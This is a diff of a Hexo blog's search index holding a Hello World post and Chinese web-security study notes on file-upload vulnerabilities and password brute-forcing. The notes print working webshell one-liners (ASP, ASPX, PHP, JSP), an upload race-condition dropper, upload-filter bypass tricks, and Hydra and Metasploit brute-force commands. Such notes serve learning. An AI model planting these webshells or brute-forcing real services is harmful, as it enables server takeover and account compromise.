@@ -1,6 +1,24 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>Hello World</title>
+    <url>/2022/08/03/hello-world/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
+<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
+<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
+<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
+<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
+]]></content>
+  </entry>
+  <entry>
     <title>hexo修改主题</title>
     <url>/2022/08/06/hexo%E4%B8%BB%E9%A2%98%E4%BF%AE%E6%94%B9/</url>
     <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><ul>
@@ -35,6 +53,43 @@
 <li>最后部署到GitHub<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexo clean//清除缓存</span><br><span class="line">hexo g//生成静态文件</span><br><span class="line">hexo s//启动服务器</span><br><span class="line">hexo d//部署，用于将网站部署到服务器上</span><br></pre></td></tr></table></figure></li>
 </ul>
 ]]></content>
+  </entry>
+  <entry>
+    <title>网络安全学习之文件上传</title>
+    <url>/2022/08/08/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h1><h2 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h2><ul>
+<li>简介：现代互联网的Web应用程序中，上传文件是一种常见的功能，因为它有助于提高业务效率，如果Web应用存在文件上传漏洞，那么恶意用户就可以利用文件上传漏洞将可执行脚本程序（WebShell）上传到服务器中，获得网站的权限，然后可以进一步对服务器进行入侵，扩大控制权限。  </li>
+<li>漏洞产生原因：<br>上传文件时，如果服务器端没有对客户端上传的文件进行严格的检验或过滤，就容易造成可上传任意文件的情况，包括上传脚本文件（asp，aspx，php，jsp）  </li>
+<li>漏洞的危害：<br>非法用户可以利用上传的脚本文件控制整个网站，甚至控制服务器。这个恶意的脚本文件，又被称为WebShell，也可将WebShell脚本称为一种网页后门，WebShell脚本具有非常强大的功能，比如查看服务器目录、服务器中的文件，执行系统命令等。</li>
+<li>ASP  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;%<span class="built_in">eval</span> request(<span class="string">&quot;x&quot;</span>)%&gt;//密码是‘x’</span><br><span class="line">&lt;%execute request(<span class="string">&quot;x&quot;</span>)%&gt;</span><br></pre></td></tr></table></figure></li>
+<li>ASPX  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;%@ Page Language=<span class="string">&quot;Jscript&quot;</span>%&gt;&lt;%<span class="built_in">eval</span>(Request.Item[<span class="string">&quot;x&quot;</span>],<span class="string">&quot;unsafe&quot;</span>);%&gt;</span><br></pre></td></tr></table></figure></li>
+<li>PHP  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php <span class="built_in">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;x&#x27;</span>])?&gt;  //比较标准的用法；不一定是post，也可以是get</span><br><span class="line">&lt;?php assert(<span class="variable">$_POST</span>[<span class="string">&#x27;x&#x27;</span>];?)&gt;  //php版本&gt;7时不能用了</span><br></pre></td></tr></table></figure></li>
+<li>JSP CMD WebShall  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;%  </span><br><span class="line">    if(&quot;x&quot;.equals(request.getParameter(&quot;pwd&quot;)))</span><br><span class="line">    &#123;</span><br><span class="line">        java.io.InputStream in=Runtime.getRuntime().exec(request.getParameter(&quot;i&quot;)).getInp</span><br><span class="line">        int a=-1;</span><br><span class="line">        byte[] b=new byte[2048];</span><br><span class="line">        out.print(&quot;&lt;pre&gt;&quot;);</span><br><span class="line">        while((a=in.read(b))!=-1)</span><br><span class="line">        &#123;</span><br><span class="line">            out.println(new String(b));</span><br><span class="line">        &#125;</span><br><span class="line">        out.print(&quot;&lt;/pre&gt;&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure></li>
+<li>文件上传漏洞的条件<br>首先，上传的文件能够被Web容器解释执行。所以文件上传后所在的目录要是Web容器所覆盖到的路径<br>其次，用户能够从Web上访问这个文件。如果文件上传了，但用户无法通过Web访问，或者无法使得Web容器解释这个脚本，那么也就不能被称之为漏洞<br>最后，用户上传的文件若被安全检查、格式化、图片压缩等功能改变了内容，也可能导致攻击不成功  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php system(&#x27;whoami&#x27;);?&gt;</span><br><span class="line">&lt;?php eval($_GET[1]);?&gt;</span><br><span class="line">?1=system(whoami);</span><br><span class="line">&lt;?php eval(system(whoami););?&gt;</span><br><span class="line">$_GET=&gt;接受GET参数</span><br><span class="line">$_POST=&gt;接受POST参数</span><br><span class="line">$_REQUEST=&gt;接受GET参数 POST Cookie 参数</span><br></pre></td></tr></table></figure></li>
+</ul>
+<h2 id="中国蚁剑antsword使用的是POST接受参数，PHP木马使用的eval"><a href="#中国蚁剑antsword使用的是POST接受参数，PHP木马使用的eval" class="headerlink" title="中国蚁剑antsword使用的是POST接受参数，PHP木马使用的eval"></a>中国蚁剑antsword使用的是POST接受参数，PHP木马使用的eval</h2><h2 id="文件头绕过："><a href="#文件头绕过：" class="headerlink" title="文件头绕过："></a>文件头绕过：</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">JPEG(jpg), 文件头：FFD8FF</span><br><span class="line">PNG(png), 文件头：89504E47</span><br><span class="line">GIF(gig), 文件头：47494638</span><br><span class="line">HTML(html), 文件头：68746D6C3E</span><br><span class="line">ZIP Archive(Zip), 文件头：504B0304</span><br><span class="line">RAR Achive(rar), 文件头：52617221</span><br><span class="line">Adobe Acrobat(pdf), 文件头：255044462D312E</span><br><span class="line">MS Word/Excel(xls.or.doc), 文件头：D0CF11E0</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>白名单策略：只允许上传xxx后缀  jpg jpeg png gif<br>黑名单策略：不允许上传xxx后缀<br>白名单是设置能通过用户，黑名单是设置不能通过用户，所以一般情况下，白名单比黑名单限制的用户多些</li>
+</ul>
+<h2 id="htaccess："><a href="#htaccess：" class="headerlink" title=".htaccess："></a>.htaccess：</h2><ul>
+<li>是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以帮我们实现：网页301重定向，自定义404错误页面，改变文件扩展名，允许&#x2F;组织特定的用户或目录的访问，禁止默认列表，配置默认文档等功能。</li>
+<li>grep -r “application&#x2F;x-httpd-php” &#x2F;etc<br>手动查询etc目录下包含”application&#x2F;x-httpd-php”的文件  </li>
+<li>htaccess解析规则<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ cat .htaccess</span><br><span class="line">AddType application/x-httpd-php .png</span><br></pre></td></tr></table></figure></li>
+<li>PHP内核是由C语言实现的，所以使用了C语言中一些字符串处理函数，比如在连接字符串的时候，0字节（\x00）将作为字符串结束符。所以在这个地方，攻击者只要在最后加入一个0字节，就能截断file变量之后的字符串<br>00 截断常配合目录截断</li>
+</ul>
+<h2 id="条件竞争"><a href="#条件竞争" class="headerlink" title="条件竞争"></a>条件竞争</h2><ul>
+<li>简介 ：是一个系统的运行结果不受控制时间的先后顺序。当这些不受控制的事件没有按照开发者想要的方式运行的时候，就可能出现bug，尤其在当我们的系统中大量对资源进行共享，，如果处理不当就会产生条件竞争漏洞。<br>攻击者上传了一个用来生成恶意shell的文件，在上传完成和安全检查完成并删除他的间隙，攻击者通过不断的发起访问请求的方法访问了该文件，该文件就会被执行，并且在服务器上生成一个恶意的shell文件，至此该文件的任务就已全部完成，至于后面发现它是一个不安全的文件并把他删除的问题就已经不重要了，因为攻击者已经成功地在服务器中植入了一个shell文件，后续的一切就都不是问题了。<br>不过竞争的马因为生存周期短的原因，所以和普通的webshell不太一样，他的使命是在有限的生命等待有缘人的光顾，然后快速生成一个小webshell。这类WebShell大体内容如下：<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php fputs(fopen(&#x27;xiao,php&#x27;,&#x27;w&#x27;),&#x27;&lt;?php eval($_REQUEST(1));?&gt;&#x27;);?&gt;</span><br></pre></td></tr></table></figure></li>
+</ul>
+<h2 id="二次渲染"><a href="#二次渲染" class="headerlink" title="二次渲染"></a>二次渲染</h2><ul>
+<li>原理：上传文件后，网站会对图片进行二次处理(格式、尺寸、要求等)，服务器会把里面的内容进行替换和更新。处理完成后，根据原有的图片生成一个新的图片并放到网站对应的标签进行显示。<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$im = imagecreatefromjpeg( $upload_file);</span><br><span class="line">$im = imagecreatefrompng( $upload_file);</span><br><span class="line">$im = imagecreatefromgif( $upload_file);</span><br></pre></td></tr></table></figure></li>
+<li>GIF 头部不会被渲染<br>渲染前后的两张GIF，没有发生变化的数据库部分直接插入 Webshell即可</li>
+<li>PNG 对应的脚本绕过<br>PNG没有GIF那么简单，需要将数据写入到PLTE数据块或者IDAT 数据块</li>
+<li>JPG<br>JPG也需要使用脚本将数据插入到特定的数据库，而且可能会不成功，所以需要多次尝试渲染两次会返回正确木马</li>
+<li>JPG坑点总结<br>需要被imagecreatefromjpeg渲染或再用工具<br>图片找的稍微大一点成功率更高<br>Payload语句越短成功率越高<br>一张图片不行就换一张不要死磕  </li>
+<li>国光补充:貌似白色的图片成功率也比较高<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php $_GET[0]($_POST[1]);?&gt; 这种payload成功率很高</span><br></pre></td></tr></table></figure></li>
+</ul>
+<h2 id="move-uploaded-file"><a href="#move-uploaded-file" class="headerlink" title="move_uploaded_file"></a>move_uploaded_file</h2><h2 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h2>]]></content>
   </entry>
   <entry>
     <title>网络安全学习之信息收集</title>
@@ -91,21 +146,103 @@
 ]]></content>
   </entry>
   <entry>
-    <title>Hello World</title>
-    <url>/2022/08/03/hello-world/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
+    <title>网络安全之认证技术</title>
+    <url>/2022/08/12/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%AE%A4%E8%AF%81%E6%8A%80%E6%9C%AF/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="系统认证爆破"><a href="#系统认证爆破" class="headerlink" title="系统认证爆破"></a>系统认证爆破</h2><h3 id="爆破工具："><a href="#爆破工具：" class="headerlink" title="爆破工具："></a>爆破工具：</h3><ul>
+<li>Hydar（九头蛇）<br><a href="https://github.com/vanhauser-thc/thc-hydar">https://github.com/vanhauser-thc/thc-hydar</a><br><img src="/2022/08/12/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%AE%A4%E8%AF%81%E6%8A%80%E6%9C%AF/1.png"><br>常用口令<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># FTP爆破</span><br><span class="line">hydar -L /root/user.txt -P /root/passwword.txt ftp://192.168.0.1 -vV    //大写字母表示导入一个字典。-vV爆出输出日志，看是什么时候成功的</span><br><span class="line"></span><br><span class="line"># SSH爆破</span><br><span class="line">hydar -L /root/user.txt -P /root/passwword.txt ssh://192.168.0.1 --vV</span><br><span class="line"></span><br><span class="line"># SMB爆破</span><br><span class="line">hydar -l admin -P password.txt smb://10.211.55.9      //小写字母&quot;l表示单个用户</span><br><span class="line"></span><br><span class="line"># MSSQL爆破</span><br><span class="line">hydar -L /root/user.txt -P /root/passwword.txt //192.168.0.1 mssql -vV</span><br><span class="line"></span><br><span class="line">#MYSQL爆破</span><br><span class="line">hydar -L /root/user.txt -P /root/passwword.txt //192.168.0.1 mysql -vV</span><br></pre></td></tr></table></figure></li>
+<li>SNETCarcker(超级弱口令工具)<br><a href="https://github.com/shack2/SNETCarcker">https://github.com/shack2/SNETCarcker</a><br><img src="/2022/08/12/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%AE%A4%E8%AF%81%E6%8A%80%E6%9C%AF/2.png"><br>是一款windows平台的弱口令审计工具，支持批量多线程检查<br><img src="/2022/08/12/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%AE%A4%E8%AF%81%E6%8A%80%E6%9C%AF/3.png"><br><img src="/2022/08/12/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%AE%A4%E8%AF%81%E6%8A%80%E6%9C%AF/4.png"></li>
+<li>关闭防火墙<br><img src="/2022/08/12/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%AE%A4%E8%AF%81%E6%8A%80%E6%9C%AF/5.png"></li>
+</ul>
+<p><img src="/2022/08/12/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%AE%A4%E8%AF%81%E6%8A%80%E6%9C%AF/6.png"><br><img src="/2022/08/12/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%AE%A4%E8%AF%81%E6%8A%80%E6%9C%AF/7.png"></p>
+<ul>
+<li>超级弱口令工具和Hydra爆破Telent不太行，尽量使用MSF爆破Telent</li>
+</ul>
+<h2 id="爆破-1521-Oracle"><a href="#爆破-1521-Oracle" class="headerlink" title="爆破 1521 Oracle"></a>爆破 1521 Oracle</h2><ul>
+<li>Oracle Datebase，又名Oracle RDBMS，或简称Oracle，是甲骨文公司的一款关系数据库管理系统。默认端口为1521端口，和其他数据库不同的是，爆破前得先爆破队赢得SID，不过SID很多都是默认的，可以使用MSF来进行爆破。<br><img src="/2022/08/12/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%AE%A4%E8%AF%81%E6%8A%80%E6%9C%AF/8.png"></li>
+</ul>
+<h3 id="Metasploit爆破SID"><a href="#Metasploit爆破SID" class="headerlink" title="Metasploit爆破SID"></a>Metasploit爆破SID</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use auxiliary/scanner/oracle/sid_bruate</span><br><span class="line">set RH0STS 10.211.55.6</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+<h3 id="Metasploit爆破Oracle"><a href="#Metasploit爆破Oracle" class="headerlink" title="Metasploit爆破Oracle"></a>Metasploit爆破Oracle</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use auxiliary/scanner/oracle/oracle_login</span><br><span class="line">show options</span><br><span class="line">set RHOSTS 10.211.55.6</span><br><span class="line">set RPORTS 1521</span><br><span class="line">set SID xxx</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+<h3 id="爆破-3306-MySQL"><a href="#爆破-3306-MySQL" class="headerlink" title="爆破 3306 MySQL"></a>爆破 3306 MySQL</h3><ul>
+<li>MySQL是一个关系型数据库管理系统，默认端口为3306<br>爆破前检测是否开启数据库外连，不要做无意义的爆破，可以手动写Python脚本来批量验证。</li>
+</ul>
+<h3 id="爆破22-SSH"><a href="#爆破22-SSH" class="headerlink" title="爆破22 SSH"></a>爆破22 SSH</h3><ul>
+<li><p>SSH为Secure Shell的缩写，是目前较为可靠，转为远程登陆会话和其他网络服务提供安全性的协议，默认端口为22<br>爆破前检测是否开启数据库外连，不要做无意义的爆破，可以手动写Python脚本来验证</p>
+</li>
+<li><p>Hydra</p>
+</li>
+<li><p>超级弱口令爆破</p>
+</li>
+<li><p>Metasploit</p>
+</li>
+</ul>
+<h3 id="爆破-23-Telnet"><a href="#爆破-23-Telnet" class="headerlink" title="爆破 23 Telnet"></a>爆破 23 Telnet</h3><ul>
+<li><p>Telnet协议是Internet远程登陆服务的标准协议和主要方式，它为用户提供了在本地计算机上完成远程主机工作的能力。用户连接上Telnet之后可以直接输入命令，然后这些命令会在服务器上运行，就像直接在服务器的控制台上输入一样。默认端口为23.</p>
+</li>
+<li><p>Metasploit</p>
+</li>
+<li><p>Telnet爆破成功后是可以直接执行系统命令的：</p>
+</li>
+<li><p>超级弱口令工具和Hydra爆破Telent不太行，尽量使用MSF爆破Telent</p>
+</li>
+</ul>
+<h3 id="爆破-445-SMB"><a href="#爆破-445-SMB" class="headerlink" title="爆破 445 SMB"></a>爆破 445 SMB</h3><ul>
+<li><p>SMB（Server Message Block）Windows协议族，用于文件和打印共享服务。默认端口为445.</p>
+</li>
+<li><p>Hydra</p>
+</li>
+<li><p>超级弱口令爆破<br><a href="https://github.com/shack2/SNETCracker">https://github.com/shack2/SNETCracker</a></p>
+</li>
+<li><p>railgun<br><a href="https://github.com/lz520520/railgun">https://github.com/lz520520/railgun</a></p>
+</li>
+<li><p>Metasploit</p>
+</li>
+</ul>
+<h3 id="坑点记录"><a href="#坑点记录" class="headerlink" title="坑点记录"></a>坑点记录</h3><ul>
+<li>超级弱口令工具在爆破高版本系统比如Windows10就不太好用：</li>
+</ul>
+<p>Hydra也不太行</p>
+<p>但是MSF依然是可以爆破的<br>另外，SMB爆破海域防火墙是否关闭有关，总的来说SMB爆破首选MSF<br>爆破Samba也是可以使用MSF或者Hydra来进行爆破的：<br>Samba是种用来让UNIX系列的操作系统与微软Windows操作系统的SMB网络协议做链接的自由软件。<br>第三版不仅可以访问及分享SMB的文件及打印机，本身还可以集成入Windows Server的网域，扮演为网域控制站以及加入Active Directory成员。</p>
+<ul>
+<li>Docker快速搭建Samba环境：</li>
+</ul>
+<h3 id="爆破1433-MSSQL"><a href="#爆破1433-MSSQL" class="headerlink" title="爆破1433 MSSQL"></a>爆破1433 MSSQL</h3><ul>
+<li>MSSQL是指微软的SQLServer数据库，默认端口为1433，默认最高用户权限为sa，拿到sa用户权限的话，基本可以顺利提权拿到系统权限。</li>
+<li>Metasploit</li>
+</ul>
+<h3 id="爆破1521-Oracle"><a href="#爆破1521-Oracle" class="headerlink" title="爆破1521 Oracle"></a>爆破1521 Oracle</h3><ul>
+<li>Oracle Datebase，又名Oracle RDBMS，或简称Oracle，是甲骨文公司的一款关系数据库管理系统。默认端口为1521端口，和其他数据库不同的是，爆破前得先爆破队赢得SID，不过SID很多都是默认的，可以使用MSF来进行爆破。</li>
+<li>Metasploit爆破SID</li>
+</ul>
+<h3 id="爆破-3306-MySQL-1"><a href="#爆破-3306-MySQL-1" class="headerlink" title="爆破 3306 MySQL"></a>爆破 3306 MySQL</h3><ul>
+<li>MySQL是一个关系型数据库管理系统，默认端口为3306<br>爆破前检测是否开启数据库外连，不要做无意义的爆破，可以手动写Python脚本来验证</li>
+<li>Hydra<br>同一个IP在短时间内产生太多（超过mysql数据库max_connection_errors的最大值）中断的数据库连接而导致的阻塞</li>
+</ul>
+<p>此时哪怕输入正确密码也无济于事了，解决方法只能重启数据库</p>
+<ul>
+<li><p>超级弱口令爆破工具</p>
+</li>
+<li><p>Metasploit</p>
+</li>
+</ul>
+<h3 id="爆破-3389-RDP"><a href="#爆破-3389-RDP" class="headerlink" title="爆破 3389 RDP"></a>爆破 3389 RDP</h3><ul>
+<li>远程桌面协议RDP是windows远程桌面所使用的协议。通过提供一个有效的用户账号密码即可登录到Windows计算机，默认端口为3389</li>
+</ul>
+<p>暴力破解计算器远程桌面账户密码，最好组一下前期的信息收集，猜测一下目标的用户名，一般Windows服务器默认账户为administrator，此外如果对方服务器开启了SMB 445端口的话尽量优先爆破SMB，  因为RDP协议比较脆弱，经不起高速的爆破。</p>
+<ul>
+<li>超级弱口令爆破工具</li>
+<li>7kbscan-RDP<br><a href="https://github.com/7kbstorm/7kbscan-RDP-Sniper">https://github.com/7kbstorm/7kbscan-RDP-Sniper</a></li>
+<li>御剑RDP爆破工具<br><a href="https://github.com/foryujian/yujianpcrack">https://github.com/foryujian/yujianpcrack</a></li>
+<li>爆破 5432 PostgreSQL<br>PostgreSQL是一种对象-关系型数据库管理系统，默认端口为5432<br>可以用超级弱口令工具爆破，也可以用Metasploit</li>
+</ul>
+<h3 id="爆破6379-Redis"><a href="#爆破6379-Redis" class="headerlink" title="爆破6379 Redis"></a>爆破6379 Redis</h3><ul>
+<li>Redis是一个开源的使用ANSI C语言编写、支持网络、可基于内存亦可持久化的日志型、key-Value数据库，并提供多种语言的API，默认端口为6379<br>可以用超级弱口令工具爆破，也可以用Metasploit</li>
+</ul>
+<h3 id="爆破8080-Tomcat"><a href="#爆破8080-Tomcat" class="headerlink" title="爆破8080 Tomcat"></a>爆破8080 Tomcat</h3><ul>
+<li>Tomcat是由Apache软件基金会属下Jakarta项目开发的Servlet容器，默认端口为 8080<br>可以使用Burp的Basic认证爆破也可以直接使用MSF的模块来进行爆破。Tomcat口令是用户名在&#x2F;conf&#x2F;tomcat-users.xml自定义配置的，容易出现弱口令，Tomcat泄漏的话很容易被getshell所有需要加固口令</li>
+</ul>
+<h3 id="爆破-27017-MongoDB"><a href="#爆破-27017-MongoDB" class="headerlink" title="爆破 27017 MongoDB"></a>爆破 27017 MongoDB</h3><ul>
+<li>MongoDB是一个基于分布样式文件存储的数据库，当配置成无验证时，存在未授权访问。默认端口为27017，可以直接使用超级弱口令工具爆破也可以使用Metasploit</li>
+</ul>
 ]]></content>
   </entry>
   <entry>
@@ -147,61 +284,6 @@
 <li>加密</li>
 <li>token</li>
 <li>验证码</li>
-</ul>
-]]></content>
-  </entry>
-  <entry>
-    <title>网络安全学习之文件上传</title>
-    <url>/2022/08/08/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h1><h2 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h2><ul>
-<li>简介：现代互联网的Web应用程序中，上传文件是一种常见的功能，因为它有助于提高业务效率，如果Web应用存在文件上传漏洞，那么恶意用户就可以利用文件上传漏洞将可执行脚本程序（WebShell）上传到服务器中，获得网站的权限，然后可以进一步对服务器进行入侵，扩大控制权限。  </li>
-<li>漏洞产生原因：<br>上传文件时，如果服务器端没有对客户端上传的文件进行严格的检验或过滤，就容易造成可上传任意文件的情况，包括上传脚本文件（asp，aspx，php，jsp）  </li>
-<li>漏洞的危害：<br>非法用户可以利用上传的脚本文件控制整个网站，甚至控制服务器。这个恶意的脚本文件，又被称为WebShell，也可将WebShell脚本称为一种网页后门，WebShell脚本具有非常强大的功能，比如查看服务器目录、服务器中的文件，执行系统命令等。</li>
-<li>ASP  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;%<span class="built_in">eval</span> request(<span class="string">&quot;x&quot;</span>)%&gt;//密码是‘x’</span><br><span class="line">&lt;%execute request(<span class="string">&quot;x&quot;</span>)%&gt;</span><br></pre></td></tr></table></figure></li>
-<li>ASPX  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;%@ Page Language=<span class="string">&quot;Jscript&quot;</span>%&gt;&lt;%<span class="built_in">eval</span>(Request.Item[<span class="string">&quot;x&quot;</span>],<span class="string">&quot;unsafe&quot;</span>);%&gt;</span><br></pre></td></tr></table></figure></li>
-<li>PHP  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php <span class="built_in">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;x&#x27;</span>])?&gt;  //比较标准的用法；不一定是post，也可以是get</span><br><span class="line">&lt;?php assert(<span class="variable">$_POST</span>[<span class="string">&#x27;x&#x27;</span>];?)&gt;  //php版本&gt;7时不能用了</span><br></pre></td></tr></table></figure></li>
-<li>JSP CMD WebShall  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;%  </span><br><span class="line">    if(&quot;x&quot;.equals(request.getParameter(&quot;pwd&quot;)))</span><br><span class="line">    &#123;</span><br><span class="line">        java.io.InputStream in=Runtime.getRuntime().exec(request.getParameter(&quot;i&quot;)).getInp</span><br><span class="line">        int a=-1;</span><br><span class="line">        byte[] b=new byte[2048];</span><br><span class="line">        out.print(&quot;&lt;pre&gt;&quot;);</span><br><span class="line">        while((a=in.read(b))!=-1)</span><br><span class="line">        &#123;</span><br><span class="line">            out.println(new String(b));</span><br><span class="line">        &#125;</span><br><span class="line">        out.print(&quot;&lt;/pre&gt;&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure></li>
-<li>文件上传漏洞的条件<br>首先，上传的文件能够被Web容器解释执行。所以文件上传后所在的目录要是Web容器所覆盖到的路径<br>其次，用户能够从Web上访问这个文件。如果文件上传了，但用户无法通过Web访问，或者无法使得Web容器解释这个脚本，那么也就不能被称之为漏洞<br>最后，用户上传的文件若被安全检查、格式化、图片压缩等功能改变了内容，也可能导致攻击不成功  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php system(&#x27;whoami&#x27;);?&gt;</span><br><span class="line">&lt;?php eval($_GET[1]);?&gt;</span><br><span class="line">?1=system(whoami);</span><br><span class="line">&lt;?php eval(system(whoami););?&gt;</span><br><span class="line">$_GET=&gt;接受GET参数</span><br><span class="line">$_POST=&gt;接受POST参数</span><br><span class="line">$_REQUEST=&gt;接受GET参数 POST Cookie 参数</span><br></pre></td></tr></table></figure></li>
-</ul>
